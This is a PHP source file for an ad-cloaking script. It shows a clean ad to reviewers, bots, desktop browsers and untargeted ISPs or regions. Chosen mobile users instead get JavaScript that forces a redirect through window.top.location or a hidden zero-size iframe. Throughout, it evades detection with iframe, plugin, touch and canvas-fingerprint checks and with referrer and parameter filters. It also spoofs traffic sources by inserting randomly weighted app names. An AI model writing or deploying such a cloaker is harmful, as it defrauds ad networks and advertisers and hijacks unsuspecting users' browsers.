<?php

	//
	// Script usage: http(s)://host/dir/ad.php?<id>
	//
	//
	// This script spits out a clean HTML ad if it detects it's either been accessed by
	// a) A non mobile browser (user agent)
	// b) The IP address is not in the allowed ISP list or blocked due to any blocked lists
	//
	// In all other cases it returns a HTML page with an body onload event, and javascript functiont that redirects to the redirect Url. The scripts basically replaces 2 tags in the
	// clean html: {script}, and {onload}. These tags should be placed in the <head>{script}</head>, and <body{onload}></body> of the clean Html.
	//
	// Ad configuration resides in the <id>.config.txt file, and can define the redirectUrl, the ad language (locale), and which redirect method should be used.
	//

	require_once("adlib.inc");

	$allowedIspsPerCountry = array("US" => array("AT&T Wireless",
												 "T-Mobile USA",
												 "Sprint PCS",
												 "Verizon Wireless",
												 "Comcast Cable",
												 "Time Warner Cable",
												 "AT&T U-verse",
												 "Charter Communications",
												 "Cox Communications",
												 "CenturyLink",
												 "Optimum Online",
												 "AT&T Internet Services",
												 "Frontier Communications",
												 "Suddenlink Communications",
												 "XO Communications",
												 "Verizon Internet Services",
												 "Mediacom Cable",
												 "Windstream Communications",
												 "Bright House Networks",
												 "Abovenet Communications",
												 "Google",
												 "Cable One", "VECTANT"),
								   "MX" => array("Telmex","Mega Cable, S.A. de C.V.","Cablemas Telecomunicaciones SA de CV","CablevisiÃ³n, S.A. de C.V.","Iusacell","Television Internacional, S.A. de C.V.","Mexico Red de Telecomunicaciones, S. de R.L. de C.","Axtel","Cablevision S.A. de C.V.","Nextel Mexico","Telefonos del Noroeste, S.A. de C.V.","Movistar MÃ©xico","RadioMovil Dipsa, S.A. de C.V."),	//MX												 
								   "FR" => array("Orange","Free SAS","SFR","OVH SAS","Bouygues Telecom","Free Mobile SAS","Bouygues Mobile","Numericable","Orange France Wireless"),	//FR									
								   "UK" => array("BT","Three","EE Mobile","Telefonica O2 UK","Vodafone","Vodafone Limited"),	//UK									
								   "AU" => array("Optus","Telstra Internet","Vodafone Australia","TPG Internet","iiNet Limited","Dodo Australia"),		//AU									
								   "JP" => array("Kddi Corporation","Softbank BB Corp","NTT","Open Computer Network","NTT Docomo,INC.","K-Opticom Corporation","@Home Network Japan","So-net Entertainment Corporation","Biglobe","Jupiter Telecommunications Co.","TOKAI","VECTANT"),		//JP									
								   "KR" => array("SK Telecom","Korea Telecom","SK Broadband","POWERCOM","Powercomm","LG Powercomm","LG DACOM Corporation","Pubnetplus","LG Telecom"),		//KR									
								   "BR" => array("Virtua","Vivo","NET Virtua","Global Village Telecom","Oi Velox","Oi Internet","Tim Celular S.A.","Embratel","CTBC","Acom Comunicacoes S.A."),	//BR									
								   "IN" => array("Airtel","Bharti Airtel Limited","Idea Cellular","Vodafone India","BSNL","Reliance Jio INFOCOMM","Airtel Broadband","Beam Telecom","Tata Mobile","Aircel","Reliance Communications","Hathway","Bharti Broadband")		//IN	
								  );

	$blacklistedSubDivs1 	= array();
	$blacklistedSubDivs2 	= array(); 
	$blacklistedCountries 	= array();
	$blacklistedContinents 	= array();

	$sourceWeightListPerCountry = array("JP" => array("iOS" 	=> array("slither.io" => 8, "謎解き母からのメモ" => 1, "Photomath" => 1, "Magic.Piano" => 1, "スヌーピードロップス" => 1), 
													  "Android" => array("YouCam.Makeup" => 8, "ANA" => 1, "スヌーピードロップス" => 1, "mora.WALKMAN.公式ミュージックストア～" => 1, "Music.player" => 1)
													 ),
								  		"MX" => array("iOS" 	=> array("Scanner.for.Me" => 8, "PicLab" => 1, "Free.Music.Mgic" => 1, "Runtastic" => 1, "Text.On.Pictures" => 1), 
								  					  "Android" => array("El.Chavo.Kart" => 8, "Zombie.Roadkill.3D" => 1, "Ice.Cream.Maker" => 1, "Kids.Doodle" => 1, "Fishing.Hook" => 1)
								  					 ),
								  	   );

	function appendReferrerParameter($url)
	{
		$url = appendParameterPrefix($url);
		$url .= "referrer=";

		return $url;
	}

	function detectMobileOS()
	{
		 $osArray = array(
	                        '/iphone/i'             =>  'iOS',
	                        '/ipod/i'               =>  'iOS',
	                        '/ipad/i'               =>  'iOS',
	                        '/android/i'            =>  'Android',
		                 );

	    foreach ($osArray as $regex => $value)
	    { 
	        if (preg_match($regex, $_SERVER['HTTP_USER_AGENT']))
	        {
	            return $value;
	        }
	    }

	    return null;
	}

	function weightedRand($sourceWeightList)
	{
	    $pos = mt_rand(1, array_sum(array_values($sourceWeightList)));           
	    $sum = 0;

	    foreach ($sourceWeightList as $source => $weight)
	    {
	        $sum += $weight;

	        if ($sum >= $pos)
	        {
	            return $source;
	        }
	    }

	    return null;
	}	

	function generateAutoRotateSourceParameter($sourceWeightList)
	{
		$result = "f_source=";
		$os = detectMobileOS();

		if ($os != null)
		{
			$result .= weightedRand($sourceWeightList[$os]);
		}

		return $result;
	}

	function appendAutoRotateSourceParameter($url, $sourceWeightList)
	{
		return appendParameterPrefix($url) . generateAutoRotateSourceParameter($sourceWeightList);
	}

	function minify($text)
	{
		$text = str_replace("\n", "", $text);
		$text = str_replace("\r", "", $text);
		$text = str_replace("\t", "", $text);

		return $text;
	}

	function createJSCode($resultHtml)
	{
		$resultHtml = minify($resultHtml);
		$resultHtml = str_replace("'", "\\'", $resultHtml);

		$resultHtml = "document.write('" . $resultHtml . "');";

		return $resultHtml;
	}

	function adlog($campaignID, $txt)
	{
		$f = fopen("logs/adlog.$campaignID.log","a");
		fwrite($f,date("m.d.y H:i:s") . ': ' . $_SERVER['REMOTE_ADDR'] . "(" . $_SERVER['HTTP_USER_AGENT'] . "): " . $txt . " \n");
		fclose($f);
	}

	function createLogLine($campaignID, $ip, $isp, $txt)
	{
		$referrer = array_key_exists('HTTP_REFERER', $_SERVER) ? $_SERVER['HTTP_REFERER'] : "Unknown";
		$line = "Date," . date('Y-m-d H:i:s') . ",IP," . $ip . ",ISP," . $isp . ",UserAgent," . $_SERVER['HTTP_USER_AGENT'] . ",Referrer," . $referrer . ",QueryString," . $_SERVER['QUERY_STRING'] . ",Message," . $txt . "\n";

		return $line;		
	}

	function mbotlog($campaignID, $ip, $isp, $txt)
	{
		$line = createLogLine($campaignID, $ip, $isp, $txt);
		$f = fopen("logs/mbotlog.$campaignID.log","a");
		fwrite($f, $line);
		fclose($f);
	}

	function allowedTrafficLog($campaignID, $ip, $isp)
	{
		$line = createLogLine($campaignID, $ip, $isp, "");
		$f = fopen("logs/allowed_traffic.$campaignID.log","a");
		fwrite($f, $line);
		fclose($f);
	}

	$queryString = $_SERVER['QUERY_STRING'];
	$ampIndex = strpos($queryString, "&");

	if ($ampIndex !== false)
	{
		$campaignID = substr($queryString, 0, $ampIndex);
		$queryString = substr($queryString, $ampIndex + 1);
	}
	else
	{
		$campaignID = $queryString;
		$queryString = "";
	}

	$cleanHtmlFilename = "ads/" . $campaignID . ".cleanad.html";
	$configFilename  = "ads/" . $campaignID . ".config.txt";

	if (!file_exists($cleanHtmlFilename) || !file_exists($configFilename))
	{
		exit;
	}

	$resultHtml = file_get_contents($cleanHtmlFilename);

	$adConfig = processConfig($configFilename);

	$redirectUrl 					= array_key_exists("RedirectUrl", $adConfig) ? $adConfig["RedirectUrl"] : "";
	$redirectMethod 				= array_key_exists("Method", $adConfig) ? $adConfig["Method"] : "";
	$redirectTimeout 				= array_key_exists("RedirectTimeout", $adConfig) ? $adConfig["RedirectTimeout"] : 3000;
	$redirectEnabled				= array_key_exists("RedirectEnabled", $adConfig) && $adConfig["RedirectEnabled"] === "false" ? false : true;
	$adCountry 						= array_key_exists("CountryCode", $adConfig) ? $adConfig["CountryCode"] : "";
	$blacklistedProvinces 			= array_key_exists("ProvinceBlackList", $adConfig) ? preg_split("/\|/", $adConfig["ProvinceBlackList"], -1, PREG_SPLIT_NO_EMPTY) : array();
	$blacklistedCities 				= array_key_exists("CityBlackList", $adConfig) ? preg_split("/\|/", $adConfig["CityBlackList"], -1, PREG_SPLIT_NO_EMPTY) : array();
	$canvasFingerprintCheckEnabled 	= array_key_exists("CanvasFingerprintCheckEnabled", $adConfig) && $adConfig["CanvasFingerprintCheckEnabled"] === "false" ? false : true;
	$blockedCanvasFingerprints		= array_key_exists("BlockedCanvasFingerprints", $adConfig) ? $adConfig["BlockedCanvasFingerprints"] : "";
	$outputMethod 					= array_key_exists("OutputMethod", $adConfig) ? $adConfig["OutputMethod"] : "";
	$trackingPixelEnabled			= array_key_exists("TrackingPixelEnabled", $adConfig) && $adConfig["TrackingPixelEnabled"] === "false" ? false : true;
	$trackingPixelUrl 				= array_key_exists("TrackingPixelUrl", $adConfig) ? $adConfig["TrackingPixelUrl"] : "";
	$loggingEnabled 				= array_key_exists("LoggingEnabled", $adConfig) && $adConfig["LoggingEnabled"] === "false" ? false : true;
	$ispCloakingEnabled 			= array_key_exists("ISPCloakingEnabled", $adConfig) && $adConfig["ISPCloakingEnabled"] === "false" ? false : true;
	$iframeCloakingEnabled 			= array_key_exists("IFrameCloakingEnabled", $adConfig) && $adConfig["IFrameCloakingEnabled"] === "false" ? false : true;
	$touchCloakingEnabled 			= array_key_exists("TouchCloakingEnabled", $adConfig) && $adConfig["TouchCloakingEnabled"] === "false" ? false : true;
	$blacklistedReferrers 			= array_key_exists("BlacklistedReferrers", $adConfig) ? preg_split("/\|/", $adConfig["BlacklistedReferrers"], -1) : array();
	$whitelistedReferrers 			= array_key_exists("WhitelistedReferrers", $adConfig) ? preg_split("/\|/", $adConfig["WhitelistedReferrers"], -1) : array();
	$blockedParameterValues			= array_key_exists("BlockedParameterValues", $adConfig) ? json_decode($adConfig["BlockedParameterValues"]) : array();

	if (empty($redirectUrl))
	{
		exit;
	}

	if (empty($adCountry))
	{
		$adCountry = "US";
	}

	$ip  = getClientIP();
	$geo = getGEOInfo($ip);
	$isp = getISPInfo($ip);

	if ($loggingEnabled)
	{
		adlog($campaignID,
			'ip:"'.$ip.'",'.
			'isp:"'.$isp['isp'].'",'.
			'city:"'.$geo['city'].'",'.
			'province:"'.$geo['province'].'",'.
			'country:"'.$geo['country'].'",'.
			'country_code:"'.$geo['country_code'].'",'.
			'continent:"'.$geo['continent'].'",'.
			'continent_code:"'.$geo['continent_code'].'",'.
			'subdiv1:"'.$geo['subdiv1'].'",'.
			'subdiv1_code:"'.$geo['subdiv1_code'].'",'.
			'subdiv2:"'.$geo['subdiv2'].'",'.
			'subdiv2_code:"'.$geo['subdiv2_code'].'"');
	}

	$serveCleanAd = false;

	if (!$serveCleanAd && array_key_exists('HTTP_REFERER', $_SERVER))
	{
		foreach ($blacklistedReferrers as $blackListedReferrer)
		{
			if ($_SERVER['HTTP_REFERER'] === "")
			{
				if ($_SERVER['HTTP_REFERER'] == $blackListedReferrer)
				{
					$serveCleanAd = true;

					if ($loggingEnabled)
					{
						mbotlog($campaignID, $ip, $isp['isp'], "EMPTY Referrer is in blacklist.");
					}

					break;					
				}
			}
			elseif (strpos($_SERVER['HTTP_REFERER'], $blackListedReferrer) !== false)
			{
				$serveCleanAd = true;

				if ($loggingEnabled)
				{
					mbotlog($campaignID, $ip, $isp['isp'], "Referrer $_SERVER[HTTP_REFERER] is in blacklist.");
				}

				break;
			}
		}

		if (!$serveCleanAd && !empty($whitelistedReferrers))
		{
			$matchedWhitelistedReferrer = false;

			foreach ($whitelistedReferrers as $whitelistedReferrer)
			{
				if ($_SERVER['HTTP_REFERER'] === "")
				{
					if ($_SERVER['HTTP_REFERER'] == $whitelistedReferrer)
					{
						$matchedWhitelistedReferrer = true;

						break;
					}
				}
				elseif (strpos($_SERVER['HTTP_REFERER'], $whitelistedReferrer) !== false)
				{
					$matchedWhitelistedReferrer = true;

					break;
				}
			}

			if (!$matchedWhitelistedReferrer)
			{
				$serveCleanAd = true;

				if ($loggingEnabled)
				{
					mbotlog($campaignID, $ip, $isp['isp'], "Referrer $_SERVER[HTTP_REFERER] is not in whitelist.");
				}				
			}
		}
	}

	if (!$serveCleanAd)
	{
		foreach ($blockedParameterValues as $parameter => $blockedValues)
		{
			if (array_key_exists($parameter, $_GET))
			{
				if (in_array($_GET[$parameter], $blockedValues))
				{
					$serveCleanAd = true;

					if ($loggingEnabled)
					{
						mbotlog($campaignID, $ip, $isp['isp'], "Parameter $parameter has blocked value: $_GET[$parameter].");
					}

					break;
				}
			}
			else
			{
				$serveCleanAd = true;

				if ($loggingEnabled)
				{
					mbotlog($campaignID, $ip, $isp['isp'], "Parameter $parameter missing from querystring.");
				}

				break;
			}
		}
	}

	if (!$serveCleanAd && !preg_match('/(iPhone|iPod|iPad|Android|BlackBerry|IEMobile|MIDP|BB10)/i', $_SERVER['HTTP_USER_AGENT']))
	{
		$serveCleanAd = true;

		if ($loggingEnabled)
		{
			adlog($campaignID, "UserAgent is not a mobile device.");
		}
	}
	elseif (!$serveCleanAd && $ispCloakingEnabled)
	{
		$allowedIsps = array();

		if (array_key_exists($adCountry, $allowedIspsPerCountry))
		{
			$allowedIsps = $allowedIspsPerCountry[$adCountry];
		}

		if ((empty($allowedIsps) || in_array($isp['isp'], $allowedIsps)) &&
			!in_array($geo['city'], $blacklistedCities) &&
			!in_array($geo['province'], $blacklistedProvinces) &&
			!in_array($geo['subdiv1_code'], $blacklistedSubDivs1) &&
			!in_array($geo['subdiv2_code'], $blacklistedSubDivs2) &&
			!in_array($geo['country'], $blacklistedCountries) &&
			!in_array($geo['continent'], $blacklistedContinents))
		{
			$serveCleanAd - false;

			if ($loggingEnabled)
			{
				adlog($campaignID, "ISP/Geo is allowed. ISP: " . $isp['isp'] . " / City: " . $geo['city'] . " / Province: " . $geo['province']);
			}
		}
		else
		{
			$serveCleanAd = true;

			if ($loggingEnabled)
			{
				adlog($campaignID, "ISP/Geo is NOT allowed. ISP: " . $isp['isp'] . " / City: " . $geo['city'] . " / Province: " . $geo['province']);
			}
		}
	}

	$referrerDomainScript = "function getReferrerDomain()
						     {
					            var topDomain = '';

					            try
					            {
					                topDomain = window.top.location.href;
					            }
					            catch(e) { }

					            if (topDomain == null || topDomain === 'undefined' || typeof topDomain == 'undefined' || topDomain.trim() === '')
					            {
					                topDomain = document.referrer;
					            }

					            return topDomain;
						     }";

	if ($trackingPixelEnabled && !empty($trackingPixelUrl))
	{
		// Append referrer
		$trackingPixelUrl = appendReferrerParameter($trackingPixelUrl);

		$trackingPixelScript = "function addTrackingPixel()
						        {
						            var topDomain = getReferrerDomain();

						            var el = document.createElement('img');
						            el.src = '$trackingPixelUrl' + encodeURIComponent(topDomain) + '&' + location.search.substring(1);
						            el.width = 0;
						            el.height = 0;
						            el.border = 0;
						            document.body.appendChild(el);
						        }";
	}

	if ($serveCleanAd || !$redirectEnabled)
	{
		if ($loggingEnabled && !$redirectEnabled)
		{
			adlog($campaignID, "Redirect disabled.");
		}

		if ($trackingPixelEnabled && !empty($trackingPixelUrl))
		{
			$onloadCode = " onload=\"addTrackingPixel();\"";

			$resultHtml = str_replace("{script}", minify("<script type=\"text/javascript\">\n" . $referrerDomainScript . $trackingPixelScript . "\n</script>"), $resultHtml);
			$resultHtml = str_replace("{onload}", $onloadCode, $resultHtml);
		}
		else
		{
			$resultHtml = str_replace("{script}", "", $resultHtml);
			$resultHtml = str_replace("{onload}", "", $resultHtml);
		}

		if ($outputMethod === "JS")
		{
			$resultHtml = str_replace("{queryString}", $queryString, $resultHtml);

			$resultHtml = createJSCode($resultHtml);
		}
	}
	else
	{
		if ($loggingEnabled)
		{
			allowedTrafficLog($campaignID, $ip, $isp['isp']);
		}

		$sourceWeightList = array();

		if (array_key_exists($adCountry, $sourceWeightListPerCountry))
		{
			$sourceWeightList = $sourceWeightListPerCountry[$adCountry];
		}

		// Append auto generated source parameter
		$redirectUrl = appendAutoRotateSourceParameter($redirectUrl, $sourceWeightList);

		// Append passed in script parameters if outputMethod == JS
		if ($outputMethod === "JS")
		{
			$redirectUrl .= appendParameterPrefix($redirectUrl) . $queryString;
		}

		// Append referrer
		$redirectUrl = appendReferrerParameter($redirectUrl);

		if ($loggingEnabled)
		{
			adlog($campaignID, $redirectUrl);
		}

		if ($redirectMethod === "windowlocation")
		{
			$redirectCode = "window.location = '$redirectUrl' + encodeURIComponent(topDomain) + '&' + location.search.substring(1);";
		}
		else if ($redirectMethod === "windowtoplocation")
		{
			$redirectCode = "window.top.location = '$redirectUrl' + encodeURIComponent(topDomain) + '&' + location.search.substring(1);";
		}
		else if ($redirectMethod === "1x1iframe")
		{
			$redirectCode = "var el = document.createElement('iframe');
							 el.src = '$redirectUrl' + encodeURIComponent(topDomain) + '&' + location.search.substring(1);
							 el.width = 1;
							 el.height = 1;
							 el.border = 'none';
							 document.body.appendChild(el);";
		}
		else // Default 0x0 iframe redirect
		{
			$redirectCode = "var el = document.createElement('iframe');
							 el.src = '$redirectUrl' + encodeURIComponent(topDomain) + '&' + location.search.substring(1);
							 el.width = 0;
							 el.height = 0;
							 el.border = 'none';
							 document.body.appendChild(el);";
		}

		$scriptCode = "<script type=\"text/javascript\">" .
						($trackingPixelEnabled && !empty($trackingPixelUrl) ? $trackingPixelScript : "") .
						($canvasFingerprintCheckEnabled && !empty($blockedCanvasFingerprints) ?
						   "function getCanvasFingerprint()
							{
								var canvas = document.createElement('canvas');
								var ctx = canvas.getContext('2d');
								var txt = 'i9asdm..$#po((^@KbXrww!~cz';

								ctx.textBaseline = 'top';
								ctx.font = \"16px 'Arial'\";
								ctx.textBaseline = 'alphabetic';
								ctx.rotate(.05);
								ctx.fillStyle = '#f60';
								ctx.fillRect(125,1,62,20);
								ctx.fillStyle = '#069';
								ctx.fillText(txt, 2, 15);
								ctx.fillStyle = 'rgba(102, 200, 0, 0.7)';
								ctx.fillText(txt, 4, 17);
								ctx.shadowBlur = 10;
								ctx.shadowColor = 'blue';
								ctx.fillRect(-20,10,234,5);
								var strng = canvas.toDataURL();

								var hash = 0;

								if (strng.length == 0)
								{
									return null;
								}

								for (i = 0; i < strng.length; i++)
								{
									var chr = strng.charCodeAt(i);
									hash = ((hash << 5) - hash) + chr;
									hash = hash & hash;
								}

								/* console.log(hash); */

								return hash;
							}

							function inBlockedCanvasList()
							{
								var blockedList = [null, $blockedCanvasFingerprints];
								var canvasFingerPrint = getCanvasFingerprint();

								var result = blockedList.indexOf(canvasFingerPrint) !== -1;

								if (typeof jslog === 'function')
								{
									if (result)
									{
										jslog('canvasFingerPrint: ' + canvasFingerPrint + ' in blocked list.');
									}
									else
									{
										jslog('canvasFingerPrint: ' + canvasFingerPrint + ' NOT in blocked list.');
									}
								}								

								return result;
							}" : "") .

						   "$referrerDomainScript

						    function inIFrame()
							{
							    try
							    {
							        return window.self !== window.top;
							    }
							    catch (e)
							    {
							        return true;
							    }
							}

							function go()
							{" .
								($trackingPixelEnabled && !empty($trackingPixelUrl) ? "addTrackingPixel();\n" : "") .
							   "if (" . ($iframeCloakingEnabled ? "inIFrame() && " : "") . "navigator.plugins.length == 0)
						   		{" .
						   			($touchCloakingEnabled ?
						   		   "if (('ontouchstart' in window) ||	/* All standard browsers, except IE */
		  								(navigator.MaxTouchPoints > 0)	|| (navigator.msMaxTouchPoints > 0))" : "") .
								   "{" .
									($canvasFingerprintCheckEnabled && !empty($blockedCanvasFingerprints) ?
									   "if (inBlockedCanvasList())
										{
											return;
										}" : "") .
									   "if (/(iphone|linux armv)/i.test(window.navigator.platform))
									    {
										    setTimeout(function()
											{
												var topDomain = getReferrerDomain();

												$redirectCode
											}, $redirectTimeout);
										}
									}
									else
									{
										if (typeof jslog === 'function')
										{
    										jslog('Touch test failed.');
										}
									}
						   		}
						   	}

					   </script>";

		if ($outputMethod === "JS")
		{
			$scriptCode .= "\n<script type=\"text/javascript\">go();</script>";

			$resultHtml = str_replace("{script}", $scriptCode, $resultHtml);
			$resultHtml = str_replace("{queryString}", $queryString, $resultHtml);

			$resultHtml = createJSCode($resultHtml);
		}
		else
		{
			$onloadCode = " onload=\"go();\"";

			$resultHtml = str_replace("{script}", minify($scriptCode), $resultHtml);
			$resultHtml = str_replace("{onload}", $onloadCode, $resultHtml);
		}
	}

	header("Expires: Mon, 01 Jan 1985 05:00:00 GMT");
	header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT");
	header("Cache-Control: no-store, no-cache, must-revalidate");
	header("Cache-Control: post-check=0, pre-check=0, max-age=0", false);
	header("Pragma: no-cache");

	if ($outputMethod == "JS")
	{
		header('Content-Type: application/javascript');
	}

	echo $resultHtml;

?>